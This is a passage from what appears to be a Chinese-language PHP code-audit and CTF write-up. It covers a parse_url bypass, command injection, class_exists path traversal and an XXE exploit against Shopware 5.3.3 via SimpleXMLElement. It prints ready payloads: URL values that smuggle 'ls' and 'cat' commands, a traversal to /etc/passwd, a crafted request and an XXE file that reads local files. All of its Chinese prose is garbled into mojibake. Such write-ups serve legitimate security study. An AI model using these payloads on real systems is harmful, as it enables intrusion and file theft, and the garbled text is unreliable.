class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=http://demo.com@sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com?sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com/sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br><span class="line">http://localhost/index.php?url=http://demo.com#sec-redclub.com</span><br><span class="line">PS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23</span><br></pre></td></tr></table></figure><p>æ¥ç€è¦ç»•è¿‡ parse_url å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ <code>$site_info[&#39;host&#39;]</code> çš„å€¼ä»¥ sec-redclub.com ç»“å°¾ï¼Œpayloadå¦‚ä¸‹ï¼š<br><code>http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-13.png"><br>å½“æˆ‘ä»¬ç›´æ¥ç”¨ cat f1agi3hEre.php å‘½ä»¤çš„æ—¶å€™ï¼Œè¿‡ä¸äº† filter_var å‡½æ•°æ£€æµ‹ï¼Œå› ä¸ºåŒ…å«ç©ºæ ¼ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š<br><code>http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code><br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¢æˆ <code>cat&lt;f1agi3hEre.php</code>å‘½ä»¤ï¼Œå³å¯æˆåŠŸè·å–flagã€‚</p><h2 id="Snow-Flake"><a href="#Snow-Flake" class="headerlink" title="Snow Flake"></a>Snow Flake</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-14.png"><br><strong>æ¼æ´è§£æ</strong> ï¼š<br>è¿™æ®µä»£ç ä¸­å­˜åœ¨ä¸¤ä¸ªå®‰å…¨æ¼æ´ã€‚ç¬¬ä¸€ä¸ªæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸Šå›¾ç¬¬8è¡Œä¸­ä½¿ç”¨äº† <strong>class_exists()</strong> å‡½æ•°æ¥åˆ¤æ–­ç”¨æˆ·ä¼ è¿‡æ¥çš„æ§åˆ¶å™¨æ˜¯å¦å­˜åœ¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºå­˜åœ¨ <strong>__autoload</strong> å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨ <strong>class_exists()</strong> å‡½æ•°å°±ä¼šè‡ªåŠ¨è°ƒç”¨æœ¬ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œè¿™é¢˜çš„æ–‡ä»¶åŒ…å«æ¼æ´å°±å‡ºç°åœ¨è¿™ä¸ªåœ°æ–¹ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ <strong>è·¯å¾„ç©¿è¶Š</strong> æ¥åŒ…å«ä»»æ„æ–‡ä»¶ï¼Œå½“ç„¶ä½¿ç”¨è·¯å¾„ç©¿è¶Šç¬¦å·çš„å‰ææ˜¯ <strong>PHP5~5.3(åŒ…å«5.3ç‰ˆæœ¬)ç‰ˆæœ¬</strong> ä¹‹é—´æ‰å¯ä»¥ã€‚ä¾‹å¦‚ç±»åä¸ºï¼š <strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</strong> çš„æŸ¥æ‰¾ï¼Œå°†æŸ¥çœ‹passwdæ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ <strong>class_exists()</strong> å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.class-exists.php"> class_exists </a> ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šæ£€æŸ¥ç±»æ˜¯å¦å·²å®šä¹‰</p><p><strong>å®šä¹‰</strong> ï¼š <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code> </p><p><strong>$class_name</strong> ä¸ºç±»çš„åå­—ï¼Œåœ¨åŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ã€‚é»˜è®¤æƒ…å†µä¸‹ <strong>$autoload</strong> ä¸º <strong>true</strong> ï¼Œå½“ <strong>$autoload</strong> ä¸º <strong>true</strong> æ—¶ï¼Œä¼šè‡ªåŠ¨åŠ è½½æœ¬ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼›å½“ <strong>$autoload</strong> ä¸º <strong>false</strong> æ—¶ï¼Œåˆ™ä¸è°ƒç”¨ <strong>__autoload</strong> å‡½æ•°ã€‚</p></blockquote><p>æˆ‘ä»¬å†æ¥è¯´è¯´ç¬¬äºŒä¸ªæ¼æ´ã€‚åœ¨ä¸Šå›¾ç¬¬9è¡Œä¸­ï¼Œæˆ‘ä»¬å‘ç°å®ä¾‹åŒ–ç±»çš„ç±»åå’Œä¼ å…¥ç±»çš„å‚æ•°å‡åœ¨ç”¨æˆ·çš„æ§åˆ¶ä¹‹ä¸‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´ï¼Œè°ƒç”¨PHPä»£ç åº“çš„ä»»æ„æ„é€ å‡½æ•°ã€‚å³ä½¿ä»£ç æœ¬èº«ä¸åŒ…å«æ˜“å—æ”»å‡»çš„æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨PHPçš„å†…ç½®ç±» <strong>SimpleXMLElement</strong> æ¥è¿›è¡Œ <strong>XXE</strong> æ”»å‡»ï¼Œè¿›è€Œè¯»å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç”šè‡³å‘½ä»¤æ‰§è¡Œï¼ˆå‰ææ˜¯å®‰è£…äº†PHPæ‹“å±•æ’ä»¶expectï¼‰ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ <strong>SimpleXMLElement</strong> ç±»çš„å®šä¹‰ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ï¼š(PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šç”¨æ¥è¡¨ç¤ºXMLæ–‡æ¡£ä¸­çš„å…ƒç´ ï¼Œä¸ºPHPçš„å†…ç½®ç±»ã€‚</p></blockquote><p>å…³äº <strong>SimpleXMLElement</strong> å¯¼è‡´çš„XXEæ”»å‡»ï¼Œä¸‹é¢å†ç»™å‡ºä¸€ä¸ªdemoæ¡ˆä¾‹ï¼Œæ–¹ä¾¿å¤§å®¶ç†è§£ï¼š</p><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-15.png"></p><h3 id="å®ä¾‹åˆ†æ-1"><a href="#å®ä¾‹åˆ†æ-1" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong>Shopware 5.3.3</strong> ç‰ˆæœ¬ï¼Œå¯¹ <strong>SimpleXMLElement</strong> ç±»å¯¼è‡´çš„ <strong>XXEæ¼æ´</strong> è¿›è¡Œåˆ†æï¼Œè€Œ <strong>class_exists()</strong> å‡½æ•°ï¼Œæˆ‘ä»¬å°†ä¼šåœ¨æœ¬æ¬¡ç»™å‡ºçš„CTFé¢˜ç›®ä¸­æ·±å…¥è®¨è®ºã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ¬æ¬¡æ¼æ´çš„æ–‡ä»¶ï¼Œåœ¨ <strong>engine\Shopware\Controllers\Backend\ProductStream.php</strong> æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ª <strong>loadPreviewAction</strong> æ–¹æ³•ï¼Œå…¶ä½œç”¨æ˜¯ç”¨æ¥é¢„è§ˆäº§å“æµçš„è¯¦ç»†ä¿¡æ¯ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-16.png"><br>è¯¥æ–¹æ³•æ¥æ”¶ä»ç”¨æˆ·ä¼ æ¥çš„å‚æ•° <strong>sort</strong> ï¼Œç„¶åä¼ å…¥ <strong>Repository</strong> ç±»çš„ <strong>unserialize</strong> æ–¹æ³•ï¼ˆå¦‚ä¸Šå›¾ç¬¬11-14è¡Œä»£ç ï¼‰ï¼Œæˆ‘ä»¬è·Ÿè¿› <strong>Repository</strong> ç±»ï¼ŒæŸ¥çœ‹ <strong>unserialize</strong> æ–¹æ³•çš„å®ç°ã€‚è¯¥æ–¹æ³•æˆ‘ä»¬å¯ä»¥åœ¨ <strong>engine\Shopware\Components\ProductStream\Repository.php</strong> æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-17.png"><br>å¯ä»¥çœ‹åˆ° <strong>Repository</strong> ç±»çš„ <strong>unserialize</strong> æ–¹æ³•ï¼Œè°ƒç”¨çš„æ˜¯ <strong>LogawareReflectionHelper</strong> ç±»çš„ <strong>unserialize</strong> æ–¹æ³•ï¼ˆå¦‚ä¸Šå›¾ç¬¬5è¡Œä»£ç ï¼‰ï¼Œè¯¥æ–¹æ³•æˆ‘ä»¬å¯ä»¥åœ¨ <strong>engine\Shopware\Components\LogawareReflectionHelper.php</strong> æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-18.png"><br>è¿™é‡Œçš„ <strong>$serialized</strong> å°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ å…¥çš„ <strong>sort</strong> ï¼ˆä¸Šå›¾ç¬¬3è¡Œï¼‰ï¼Œç¨‹åºåˆ†åˆ«ä» <strong>sort</strong> ä¸­æå–å‡ºå€¼èµ‹ç»™ <strong>$className</strong> å’Œ <strong>$arguments</strong> å˜é‡ï¼Œç„¶åè¿™ä¸¤ä¸ªå˜é‡è¢«ä¼ å…¥ <strong>ReflectionHelper</strong> ç±»çš„ <strong>createInstanceFromNamedArguments</strong> æ–¹æ³•ã€‚è¯¥æ–¹æ³•ä½äº <strong>engine\Shopware\Components\ReflectionHelper.php</strong> æ–‡ä»¶ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-19.png"><br>è¿™é‡Œæˆ‘ä»¬å…³æ³¨ <strong>ç¬¬6è¡Œ</strong> ä»£ç ï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªåå°„ç±»ï¼Œè€Œç±»çš„åç§°å°±æ˜¯ä» <strong>$sort</strong> å˜é‡æ¥çš„ï¼Œå¯è¢«ç”¨æˆ·æ§åˆ¶åˆ©ç”¨ã€‚ç»§ç»­å¾€ä¸‹çœ‹ï¼Œåœ¨ä»£ç ç¬¬28è¡Œå¤„ç”¨ <strong>$newParams</strong> ä½œä¸ºå‚æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹å¯¹è±¡ã€‚è€Œè¿™é‡Œçš„  <strong>$newParams</strong> æ˜¯ä» <strong>$arguments[$paramName]</strong> ä¸­å–å€¼çš„ï¼Œ <strong>$arguments</strong> åˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå› ä¸ºä¹Ÿæ˜¯ä» <strong>$sort</strong> å˜é‡æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œæ¥å®ä¾‹åŒ–ä¸€ä¸ª <strong>SimpleXMLElement</strong> ç±»å¯¹è±¡ï¼Œå½¢æˆä¸€ä¸ªXXEæ¼æ´ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨</strong><br>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç™»å½•åå°ï¼Œæ‰¾åˆ°è°ƒç”¨ <strong>loadPreviewAction</strong> æ¥å£çš„ä½ç½®ï¼Œå‘ç°å…¶è°ƒç”¨ä½ç½®å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-20.png"><br>å½“æˆ‘ä»¬ç‚¹å‡» <strong>Refresh preview</strong> æŒ‰é’®æ—¶ï¼Œå°±ä¼šè°ƒç”¨ <strong>loadPreviewAction</strong> æ–¹æ³•ï¼Œç”¨BurpSuiteæŠ“åˆ°åŒ…å¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shopware520/backend/ProductStream/loadPreview?_dc=1530963660916&amp;sort=&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;&amp;conditions=&#123;&#125;&amp;shopId=1&amp;currencyId=1&amp;customerGroupKey=EK&amp;page=1&amp;start=0&amp;limit=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">X-CSRF-Token</span><span class="punctuation">: </span>IKiwilE7pecuIUmEAJigyg6fVXY6vR</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/shopware520/backend/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SHOPWAREBACKEND=78ghtddjn8n8efpv1cudj6eao0; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; goods[cart]=180615151154565652; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <strong>sort</strong> å€¼ä¸º <code>&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;</code> ,äºæ˜¯æˆ‘ä»¬æŒ‰ç…§å…¶æ ¼å¼æ„é€ payloadï¼š <code>&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</code> ï¼Œå…³äºpayloadçš„å«ä¹‰ï¼Œå¯ä»¥çœ‹çœ‹ <strong>SimpleXMLElement</strong> ç±»çš„ <strong>__construct</strong> å‡½æ•°å®šä¹‰ï¼Œå…·ä½“ç‚¹ <a href="http://php.net/manual/zh/simplexmlelement.construct.php">è¿™é‡Œ</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span> [, <span class="keyword">bool</span> <span class="variable">$data_is_url</span> = <span class="literal">FALSE</span> [, <span class="keyword">string</span> <span class="variable">$ns</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">bool</span> <span class="variable">$is_prefix</span> = <span class="literal">FALSE</span> ]]]] )</span><br></pre></td></tr></table></figure><p>ç¬”è€…æ‰€ç”¨çš„xxe.xmlå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/phpStudy/PHPTutorial/WWW/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘é€payloadï¼Œå¹¶ç”¨xdebugè°ƒè¯•ç¨‹åºï¼Œæœ€åç¨‹åºå°†æˆ‘ä»¬è¯»å–çš„å€¼å­˜å‚¨åœ¨ <strong>$conditions</strong> å˜é‡ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-21.png"><br>å…³äºPHPä¸­XXEæ¼æ´çš„ä¿®å¤ï¼Œæˆ‘ä»¬å¯ä»¥è¿‡æ»¤å…³é”®è¯ï¼Œå¦‚ï¼š <strong>ENTITY</strong> ã€ <strong>SYSTEM</strong> ç­‰ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç¦æ­¢åŠ è½½XMLå®ä½“å¯¹è±¡çš„æ–¹å¼ï¼Œæ¥é˜²æ­¢XXEæ¼æ´ï¼ˆå¦‚ä¸‹å›¾ç¬¬2è¡Œä»£ç ï¼‰ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-22.png"><br>æˆ‘æ„Ÿè§‰ä¸Šé¢å®ä¾‹çš„åˆ©ç”¨å…³é”®ç‚¹åœ¨äºï¼Œç±»çš„åˆå§‹åŒ–å’Œå‚æ•°çš„ä¼ é€’éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>å®šä¹‰ä¸€ä¸ª <code>NotFound</code> ç±»<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>è¿™ä¸ª <code>NotFound</code> ç±»æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œè¯¥å‡½æ•°è°ƒç”¨äº† <code>die(&#39;404&#39;);</code>ã€‚è¿™æ„å‘³ç€å½“è¿™ä¸ªç±»è¢«å®ä¾‹åŒ–æ—¶ï¼Œè„šæœ¬ä¼šç«‹å³ç»ˆæ­¢å¹¶è¾“å‡º <code>404</code>ã€‚è¿™é€šå¸¸ç”¨äºè¡¨ç¤ºæœªæ‰¾åˆ°ï¼ˆå¦‚é¡µé¢æˆ–èµ„æºï¼‰ã€‚</li></ul><ol start="2"><li>æ³¨å†Œä¸€ä¸ªè‡ªåŠ¨åŠ è½½å‡½æ•°<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>spl_autoload_register</code> å‡½æ•°ç”¨äºæ³¨å†Œä»»æ„æ•°é‡çš„è‡ªåŠ¨åŠ è½½å™¨ï¼Œè¿™äº›åŠ è½½å™¨åœ¨PHPæ‰§è¡Œè¿‡ç¨‹ä¸­è¯•å›¾ä½¿ç”¨æœªå®šä¹‰çš„ç±»æˆ–æ¥å£æ—¶è¢«è°ƒç”¨ã€‚</li><li>è¿™é‡Œæ³¨å†Œçš„åŒ¿åå‡½æ•°åœ¨å°è¯•è‡ªåŠ¨åŠ è½½ä¸€ä¸ªç±»æ—¶åˆ›å»ºä¸€ä¸ª <code>NotFound</code> ç±»çš„å®ä¾‹ï¼Œå› æ­¤æ— è®ºä»€ä¹ˆç±»åè¢«è¯·æ±‚ï¼Œéƒ½å°†è¾“å‡º404å¹¶ç»ˆæ­¢æ‰§è¡Œã€‚</li></ul><ol start="3"><li>è·å–HTTP GETå‚æ•°<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li></ol><ul><li>è¿™æ®µä»£ç é€šè¿‡GETè¯·æ±‚è¯»å– <code>name</code>ã€<code>param</code> å’Œ <code>param2</code> å‚æ•°ï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜åœ¨å˜é‡ <code>$classname</code>ã€<code>$param</code> å’Œ <code>$param2</code> ä¸­ã€‚å¦‚æœè¿™äº›GETå‚æ•°ä¸å­˜åœ¨ï¼Œåˆ™ç›¸åº”çš„å˜é‡è¢«è®¾ç½®ä¸º <code>null</code>ã€‚</li></ul><ol start="4"><li>æ£€æŸ¥ç±»æ˜¯å¦å­˜åœ¨å¹¶å®ä¾‹åŒ–<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>class_exists($classname)</code> å‡½æ•°æ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å·²å®šä¹‰ï¼Œè¿™ä¹Ÿä¼šè§¦å‘è‡ªåŠ¨åŠ è½½æœºåˆ¶ã€‚</li><li>å¦‚æœç±»å­˜åœ¨ï¼Œä»£ç å°†ä½¿ç”¨åŠ¨æ€ä¼ å…¥çš„å‚æ•° <code>$param</code> å’Œ <code>$param2</code> åˆ›å»ºè¿™ä¸ªç±»çš„å®ä¾‹ã€‚</li><li>ä½¿ç”¨ <code>var_dump($newclass);</code> è¾“å‡ºæ–°åˆ›å»ºå¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</li><li>ä½¿ç”¨ <code>foreach</code> å¾ªç¯éå†å¯¹è±¡çš„å…¬å¼€å±æ€§å¹¶æ‰“å°å®ƒä»¬ã€‚</li></ul><p>è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯å®ä¾‹åŒ–æ¼æ´ç»“åˆXXEæ¼æ´ã€‚æˆ‘ä»¬åœ¨ä¸Šå›¾ç¬¬18è¡Œå¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† <strong>class_exists</strong> å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ <strong>__autoload</strong> 